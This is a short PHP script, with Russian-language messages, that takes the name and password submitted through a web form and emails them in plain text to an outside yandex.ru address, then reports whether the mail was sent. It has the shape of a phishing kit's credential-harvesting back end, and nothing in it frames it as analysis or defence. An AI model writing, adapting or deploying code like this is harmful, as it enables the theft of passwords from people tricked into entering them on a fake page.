<?php
	$result = mail("shadowfareed@yandex.ru", "Тема_письма", "С сайта была получена анкета: Имя: $_POST[name] Пароль: $_POST[pass]");

	if ($result) {
		echo ("<p>Сообщение успешно отправлено</p>");
	} else {
		echo ("<p>Сообщение НЕ отправлено</p>");
	}

?>